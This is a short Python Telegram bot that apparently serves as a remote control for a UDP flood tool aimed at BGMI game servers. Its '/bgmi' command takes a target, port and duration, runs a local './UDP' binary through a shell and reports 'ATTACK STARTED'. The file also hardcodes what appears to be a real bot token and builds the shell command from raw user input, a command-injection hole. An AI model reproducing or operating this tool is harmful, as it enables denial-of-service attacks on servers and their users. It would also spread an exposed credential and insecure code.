from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import subprocess

# Replace with your actual bot token
TOKEN = '7534823163:AAEceD0HFpwWwIdst5ff4RhyStZ8CkRtItI'
# Admin ID
ADMIN_ID = 1847934841

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Hello! Use /bgmi <target> <port> <time> to run a command.")

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        await update.message.reply_text("DM FOR FREE ACCESS @NEXION_OWNER")
        await update.message.reply_text("JOIN TELEGRAM CHANEL @NEXION_GAMEING")
        return

    if len(context.args) != 3:
        await update.message.reply_text("✅ Usage :- /bgmi <target> <port> <time>")
        return

    target, port, time = context.args

    # Send the attack started message
    await update.message.reply_text(
        f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 🔥\n\n"
        f"𝙏𝙖𝙧𝙜𝙚𝙩: {target}\n"
        f"𝙋𝙤𝙧𝙩: {port}\n"
        f"𝙏𝙞𝙢𝙚: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
    )

    # Format the command to run
    command = f"./UDP {target} {port} {time}"

    try:
        # Run the command
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError:
        # Suppress error output
        pass

    # Send the attack finished message
    await update.message.reply_text("𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃")

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('bgmi', bgmi))

    application.run_polling()

if __name__ == '__main__':
    main()
